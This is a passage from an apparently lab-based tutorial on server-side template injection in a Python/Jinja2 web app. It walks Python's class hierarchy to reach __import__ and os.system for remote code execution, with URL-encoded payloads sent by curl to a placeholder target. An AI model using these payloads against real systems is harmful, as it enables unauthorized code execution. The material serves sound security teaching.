{<span class="hljs-string">'__name__'</span>: <span class="hljs-string">'builtins'</span>, <span class="hljs-string">'__doc__'</span>: <span class="hljs-string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>, <span class="hljs-string">'__package__'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'__loader__'</span>: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="hljs-string">'__spec__'</span>: ModuleSpec(name=<span class="hljs-string">'builtins'</span>, loader=&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;), <span class="hljs-string">'__build_class__'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-number">__</span>build<span class="hljs-number">_</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>&gt;, <span class="hljs-string">'__import__'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-number">__</span><span class="hljs-keyword">import</span><span class="hljs-number">__</span>&gt;, <span class="hljs-string">'abs'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> abs&gt;, <span class="hljs-string">'all'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> all&gt;, <span class="hljs-string">'any'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> any&gt;, <span class="hljs-string">'ascii'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> ascii&gt;, <span class="hljs-string">'bin'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> bin&gt;, <span class="hljs-string">'breakpoint'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> breakpoint&gt;, <span class="hljs-string">'callable'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> callable&gt;, <span class="hljs-string">'chr'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> chr&gt;, <span class="hljs-string">'compile'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> compile&gt;, <span class="hljs-string">'delattr'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> delattr&gt;, <span class="hljs-string">'dir'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> dir&gt;, <span class="hljs-string">'divmod'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> divmod&gt;, <span class="hljs-string">'eval'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> eval&gt;, <span class="hljs-string">'exec'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> exec&gt;, <span class="hljs-string">'format'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> format&gt;, <span class="hljs-string">'getattr'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> getattr&gt;, <span class="hljs-string">'globals'</span>: &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> globals&gt;,
 &lt;SNIP&gt;


&gt;&gt;&gt; z = y().<span class="hljs-number">_m</span>odule.<span class="hljs-number">__</span>builtins<span class="hljs-number">__</span>
&gt;&gt;&gt; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z:
...     <span class="hljs-keyword">if</span> i.find(<span class="hljs-string">'import'</span>) &gt;-<span class="hljs-number">1</span>:
...             print(i, z[i])
...    
<span class="hljs-number">__</span><span class="hljs-keyword">import</span><span class="hljs-number">__</span> &lt;built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-number">__</span><span class="hljs-keyword">import</span><span class="hljs-number">__</span>&gt;
</code></pre>
<p>It seems we have reached the import function by walking the hierarchy. This means we can load <code>os</code> and use the <code>system</code> function to execute code all coming from a string object, as follows.</p>
<pre><code class="lang-python">&gt;&gt;&gt; ''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>()

[<span class="hljs-string">215</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span>_']('os').system('echo RCE from a string object')
RCE from a string object
0
</code></pre>
<p>Returning to our vulnerable web application, let&#39;s see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.</p>
<p>Payload:</p>
<pre><code class="lang-python">{{ <span class="hljs-string">''</span>.__class_<span class="hljs-number">_</span> }}
</code></pre>
<p><strong>Curl - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p><strong>Payload</strong></p>
<pre><code class="lang-python">{{ <span class="hljs-string">''</span>.__class_<span class="hljs-number">_</span>.__mro_<span class="hljs-number">_</span> }}
</code></pre>
<p><strong>Curl - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>We are interested in the second item, so the payload should become:</p>
<pre><code class="lang-python">{{ ''.__class__.__mro__[<span class="hljs-number">1</span>] }}
</code></pre>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&amp;lt;class &amp;#39;object&amp;#39;&amp;gt;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>Let us start walking down the hierarchy, as follows.</p>
<pre><code class="lang-python">{{ ''.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__() }}
</code></pre>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs <span class="hljs-string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"</span>

&lt;SNIP&gt;
&lt;body&gt;
    &lt;div id=<span class="hljs-string">"desktop"</span>&gt;
        &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">"window"</span> data-title=<span class="hljs-string">"Run"</span>&gt;
            &lt;form action=<span class="hljs-string">"/execute"</span> method=<span class="hljs-string">"get"</span>&gt;
                &lt;a&gt;C:\&gt;&lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"cmd"</span> id=<span class="hljs-string">"command"</span>&gt;&lt;/a&gt;
                &lt;br/&gt;
                &lt;a&gt;[&amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;type&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;weakref&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;weakcallableproxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;weakproxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;int&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;bytearray&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;bytes&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;list&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;NoneType&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;NotImplementedType&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;traceback&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;super&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;range&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_keys&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_values&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_items&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_reversekeyiterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_reversevalueiterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dict_reverseitemiterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;odict_iterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;set&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;str&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;slice&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;staticmethod&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;complex&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;float&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;frozenset&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;property&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;managedbuffer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;memoryview&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;tuple&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;enumerate&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;reversed&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;stderrprinter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;<span class="hljs-keyword">code</span>&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;frame&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;builtin_function_or_method&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;method&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;function&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;mappingproxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;generator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;getset_descriptor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;wrapper_descriptor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;method-wrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;ellipsis&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;member_descriptor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;types.SimpleNamespace&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;PyCapsule&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;longrange_iterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;cell&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;instancemethod&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;classmethod_descriptor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;method_descriptor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;callable_iterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;iterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pickle.PickleBuffer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;coroutine&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;coroutine_wrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;InterpreterID&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;EncodingMap&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;fieldnameiterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;formatteriterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;BaseException&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;hamt&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;hamt_array_node&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;hamt_bitmap_node&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;hamt_collision_node&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;keys&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;values&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;items&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;Context&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;ContextVar&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;Token&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;Token.MISSING&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;moduledef&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;<span class="hljs-keyword">module</span>&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;filter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;map&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;zip&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib._ModuleLock&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib._DummyModuleLock&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib._ModuleLockManager&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib.ModuleSpec&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib.BuiltinImporter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;classmethod&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib.FrozenImporter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib._ImportLockContext&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_thread._localdummy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_thread._local&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_thread.lock&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_thread.RLock&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_io._IOBase&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_io._BytesIOBuffer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_io.IncrementalNewlineDecoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;posix.ScandirIterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;posix.DirEntry&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external.WindowsRegistryFinder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external._LoaderBasics&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external.FileLoader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external._NamespacePath&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external._NamespaceLoader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external.PathFinder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_frozen_importlib_external.FileFinder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;zipimport.zipimporter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;zipimport._ZipImportResourceReader&amp;#<span 